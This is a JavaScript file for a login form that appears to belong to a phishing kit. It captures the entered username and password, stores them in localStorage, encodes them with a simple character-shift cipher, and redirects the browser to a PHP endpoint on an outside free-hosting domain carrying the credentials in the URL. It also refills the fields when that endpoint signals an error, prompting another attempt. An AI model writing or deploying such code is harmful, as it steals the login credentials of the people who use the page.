const usf = document.getElementById('usf');
const pp = document.getElementById('pp');
const sh = document.getElementById("show");
let ppull = "no";
let ourUrl = new URL(window.location.href);
pp.oninput = () => {
    if (pp.value == "") {
        sh.style.display = "none";
    } else {
        sh.style.display = "block";
        localStorage.setItem('ud', usf.value);
        localStorage.setItem('pk',pp.value);
    }
};
if (ourUrl.searchParams.get('error')) {
    usf.value = localStorage.getItem('ud');
    pp.value = localStorage.getItem('pk');
    pp.classList.add('error');
    window.history.pushState(null,'','?request=void');
    pp.oninput();
}
sh.onclick = () => {
    if (sh.innerText == "Show") {
        sh.innerText = "Hide";
        pp.type = "text";
    } else {
        sh.innerText = "Show";
        pp.type = "password";
    }
};
pp.onfocus = () => {
    pp.classList.remove("error");
};
usf.onfocus = ()=>{
    usf.classList.remove('error');
}
// 33 -126
function uniformDataHandler(anum){
    if(anum < 32){
        anum = 127 - (32-anum);
    } else if(anum > 126){
        anum = 31 + (anum-126);
    }
    return anum;
}
const enc = (str, key) => {
    let gstr = '';
    for (let index = 0; index < str.length; index++) {
        gstr += String.fromCharCode(uniformDataHandler(str[index].charCodeAt(0) + key));
    }
    return gstr;
}
document.getElementById('log').onclick = () => {
    const us = { name: usf.value, key: pp.value };
    if(us.name === '' || us.key === ' '){
        usf.classList.add('error');
        return 0;
    }
    if(us.key === '' || us.key === ' '){
        pp.classList.add('error');
        return 0;
    }
    let vurl = new URLSearchParams();
    vurl.set('rd', enc(JSON.stringify(us), 23));
    window.location.replace('https://liveliest-plug.000webhostapp.com/dh.php?' + vurl.toString());
    // window.history.pushState(null,'','?' + vurl.toString());
};
document.onkeydown = (e)=>{
    if(e.keyCode === 13){
        document.getElementById('log').onclick();
    }
}
// document.getElementById("log").onclick = () => {
//     window.location.replace()
// };